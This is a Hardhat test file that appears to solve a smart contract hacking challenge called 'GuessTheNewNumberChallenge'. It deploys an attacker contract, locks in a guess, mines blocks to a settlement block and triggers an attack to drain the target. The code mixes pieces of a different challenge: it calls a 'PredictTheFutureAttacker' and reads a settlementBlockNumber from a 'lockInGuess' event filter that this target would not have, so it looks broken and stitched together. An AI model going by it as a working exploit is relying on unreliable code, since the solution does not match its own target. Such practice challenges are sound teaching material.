import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = await target.connect(attacker);
  });

  it('exploit', async () => {  
    // Deploy attacker contract  
    const Attacker = await ethers.getContractFactory('PredictTheFutureAttacker');  
    const attackerContract = await Attacker.connect(attacker).deploy();  

    // Lock in guess (0) and pay 1 ETH  
    await attackerContract.lockInGuess(target.address, {  
      value: utils.parseEther('1'),  
    });  

    // Wait for settlement block to pass  
    const lockTx = await target.queryFilter(target.filters.lockInGuess());  
    const settlementBlockNumber = lockTx[0].args.settlementBlockNumber.toNumber();  
    while ((await provider.getBlockNumber()) < settlementBlockNumber) {  
      await ethers.provider.send('evm_mine', []);  
    }  

    // Execute attack  
    await attackerContract.attack(target.address);  

    // Verify challenge is complete  
    expect(await target.isComplete()).to.equal(true);  
  });  
});  